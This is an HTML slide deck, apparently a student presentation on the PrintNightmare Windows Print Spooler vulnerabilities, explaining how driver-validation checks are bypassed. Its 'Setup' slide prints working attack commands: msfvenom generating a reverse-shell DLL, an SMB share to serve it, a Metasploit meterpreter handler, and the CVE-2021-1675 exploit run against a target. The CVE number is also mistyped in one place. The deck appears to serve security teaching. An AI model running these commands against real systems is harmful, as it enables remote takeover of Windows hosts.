<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<title>PrintNightmare</title>
<meta name="author" content="Sudhanv Apte, 陳峰楷, 李光耀, Abdillahi Ahmed"/>
<meta name="description" content=""/>
<meta name="keywords" content=""/>
<style type="text/css">
.underline { text-decoration: underline; }
</style>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css"/>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/serif.css" id="theme"/>

<link rel="stylesheet" href="css/extra.css"/>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</head>
<body>
<div class="reveal">
<div class="slides">
<section id="sec-title-slide"><h2 class="title">PrintNightmare</h2><em></em><br><br>Sudhanv Apte, 陳峰楷, 李光耀, Abdillahi Ahmed<br>
</section>
<section id="sec-table-of-contents"><div id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#/slide-org410f532">Introduction</a></li>
<li><a href="#/slide-org56e590a">Vulnerabiltity Analysis</a></li>
<li><a href="#/slide-orgee946f0">Implementation</a></li>
<li><a href="#/slide-orgc059e70">Demo</a></li>
<li><a href="#/slide-orgee64e36">Conclusion</a></li>
</ul>
</div>
</div>
</section>


<section>
<section id="slide-org410f532">
<h2 id="org410f532">Introduction</h2>
<ul>
<li>Windows has a service called Print Spooler</li>
<li>Manages all local and network printing</li>

</ul>

</section>
<section id="slide-org4e73513">
<h3 id="org4e73513">CVEs</h3>
<ul>
<li><b>CVE-2021-1675</b>, low class vulnerability, allowed privilege escalation</li>
<li>Required direct access to the system thus labeled low risk</li>
<li>Fixed by MS as of Jun 8, 2021</li>
<li><b>CVE-221-34527</b>, high risk, allowed remote code execution</li>
<li>Rated 8.8 on the Common Vulnerabiltity Scoring System Scale</li>

</ul>
</section>
</section>
<section>
<section id="slide-org56e590a">
<h2 id="org56e590a">Vulnerabiltity Analysis</h2>
<ul>
<li><p>
Two vulns are triggered by the PrintSpoolerService RPC method
</p>

<div id="orga0f260a" class="figure">
<p><img src="./assets/nspt/cve1.png" alt="cve1.png" width="70%" />
</p>
</div>


<div id="org98f16f4" class="figure">
<p><img src="./assets/nspt/cve2.png" alt="cve2.png" width="70%" />
</p>
</div></li>

<li><b>mimikatz</b> was first to implement the exploit with both CVEs</li>

</ul>

</section>
<section id="slide-org384771a">
<h3 id="org384771a">The Vulnerability</h3>
<ul>
<li><p>
Use Process monitor to capture EXP when DLL is loaded
</p>

<div id="org329c576" class="figure">
<p><img src="./assets/nspt/pm.png" alt="pm.png" width="70%" />
</p>
</div></li>
<li><p>
dwFileCopyFlags check is skipped when calling YAddPrinterDriverEx method
</p>
<p width="60%">
<img src="./assets/nspt/yadd.png" alt="yadd.png" width="60%" />
  <img src="./assets/nspt/apd.png" alt="apd.png" />
</p></li>

</ul>
</section>
<section id="slide-orgaf4f752">
<h3 id="orgaf4f752">ValidateObjectAccess</h3>
<ul>
<li>mimikatz will pass RpcBindingSetAuthInfoEx method with some params</li>
<li>After execution, user sets username which is regarded as permission</li>
<li><p>
ValidateObjectAccess result is 0 for user and 1 for admin
</p>

<div id="org59eaec2" class="figure">
<p><img src="./assets/nspt/rpcbind.png" alt="rpcbind.png" width="60%" />
</p>
</div></li>
<li>To bypass the ValidateObjectAccess, if the &ldquo;APD INSTALL WARNED DRIVER&rdquo; is set to 1</li>
<li><p>
The result of _bittest method is 1, as a result ValidateObjectAccess is bypassed
</p>

<div id="org1e19e1d" class="figure">
<p><img src="./assets/nspt/bittest.png" alt="bittest.png" width="60%" />
</p>
</div></li>

</ul>
</section>
<section id="slide-org407edf6">
<h3 id="org407edf6">ValidateDriverInfo</h3>
<ul>
<li>This part checks if the driver name is valid</li>
<li>Execution flow is as follows:
<ul>
<li>Check if it is a local file</li>
<li>Check init key</li>
<li>Verify legitimacy of the driver file
<img src="./assets/nspt/vdi.png" alt="vdi.png" /></li>

</ul></li>
<li>When dwFileCopyFlags contains APD INSTALL WARNED DRIVER, the result is 0x8000 and value is 0</li>
<li><p>
This skips further verification by driver
</p>


<div id="orgc6838f7" class="figure">
<p><img src="./assets/nspt/dwfile.png" alt="dwfile.png" width="50%" />
</p>
</div></li>

</ul>
</section>
<section id="slide-orgff598d8">
<h3 id="orgff598d8">Get file handle</h3>
<ul>
<li>Value of v13 is obtained by inverting lower 8 bits of dwFileCopyFlags</li>
<li>Shifting it 4 bits to right and performing AND with 1</li>
<li><p>
v13 determines 5th param of the CreateInternalDriverFileArray
</p>

<div id="org8415478" class="figure">
<p><img src="./assets/nspt/spl.png" alt="spl.png" width="60%" />
</p>
</div></li>
<li>After calculation, when value of lower 8 bits of dwFileCopyFlags is 0x1X, a5 can be set to 0</li>

</ul>
</section>
<section id="slide-orgff598d8-split">
<ul>
<li><p>
When a5 is 0, validity check of the driver can be avoided
</p>

<div id="org74b9c29" class="figure">
<p><img src="./assets/nspt/a5.png" alt="a5.png" width="50%" />
</p>
</div></li>
<li>Open file via CreateFile method, get 3 file handles</li>
<li>Save them in space requested by DllAllocSplMem method for later file update use
<img src="./assets/nspt/dll.png" alt="dll.png" /></li>

</ul>

</section>
<section id="slide-org0c72f42">
<h3 id="org0c72f42">Copy files to driver space</h3>
<ul>
<li>pConfigFile, pDataFile and pDriverPath save their respective file paths</li>
<li>When moving files of the above members, the following operations are required:
<ul>
<li>Check file info of the file handle</li>
<li>Copy file to <b>&ldquo;C:\Windows\System32\spool\drivers\x64\3\new&rdquo;</b></li>
<li><p>
Using MoveNewDriverRelatedFiles, move files and realize the update file
</p>

<div id="org304603c" class="figure">
<p><img src="./assets/nspt/copy.png" alt="copy.png" width="60%" />
</p>
</div></li>

</ul></li>

</ul>
</section>
<section id="slide-orgbbe17a0">
<h3 id="orgbbe17a0">Update Driver Files</h3>
<ul>
<li>Load the new config file</li>
<li>When loaded it will run the driver&rsquo;s DLL</li>
<li>Our DLL will be executed with highest privilege
<img src="./assets/nspt/update.png" alt="update.png" /></li>

</ul>

</section>
</section>
<section>
<section id="slide-orgee946f0">
<h2 id="orgee946f0">Implementation</h2>
<ul>
<li>Environment:
<ul>
<li>Windows 10 1607</li>
<li>Kali 2022.3</li>
<li>Python 3.10.5</li>

</ul></li>

<li>Git repos used:
<ul>
<li><a href="https://github.com/tryhackme/CVE-2021-1675">https://github.com/tryhackme/CVE-2021-1675</a></li>
<li><a href="https://github.com/tryhackme/impacket">https://github.com/tryhackme/impacket</a></li>
<li><a href="https://github.com/JohnHammond/CVE-2021-34527">https://github.com/JohnHammond/CVE-2021-34527</a></li>

</ul></li>

<li>python requires impacket which can be installed through github</li>

</ul>

</section>
<section id="slide-org41215e5">
<h3 id="org41215e5">Setup</h3>
<ul>
<li><p>
Setup exploit DLL
</p>
<pre  class="example" >
msfvenom -p /reverse_tcp_path LHOST=[YOUR_IP] LPORT=4545 -f dll -o spoolerevil.dll
</pre></li>
<li><p>
Execute DLL
</p>
<pre  class="example" >
smbserver.py share [YOUR_EXPLOIT_DLL_LOCATION] -smb2support

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [YOUR_IP]
set LPORT 4545
run -j
</pre></li>
<li><p>
DLL Injection
</p>
<pre  class="example" >
python CVE-2021-1675.py username:password@&lt;targetName or address&gt; Path to DLL

session -i 1
</pre></li>

</ul>

</section>
</section>
<section>
<section id="slide-orgc059e70">
<h2 id="orgc059e70">Demo</h2>
</section>
</section>
<section>
<section id="slide-orgee64e36">
<h2 id="orgee64e36">Conclusion</h2>
<ul>
<li>Spooler vuln was first used in Stuxnet attack 10 years ago</li>
<li>MSs incomplete patch of the CVEs made windows users vulnerable to attacks</li>
<li>MS has taken step to ameliorate the situation but 34527 is still unsolved</li>

</ul>
</section>
</section>
</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>
<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/markdown/markdown.js"></script>
<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/zoom/zoom.js"></script>
<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/notes/notes.js"></script>


<script>
// Full list of configuration options available here:
// https://github.com/hakimel/reveal.js#configuration
Reveal.initialize({
plugins: [RevealMarkdown, RevealZoom, RevealNotes],
transition: 'concave', width:1200, height:800
});

</script>
</body>
</html>
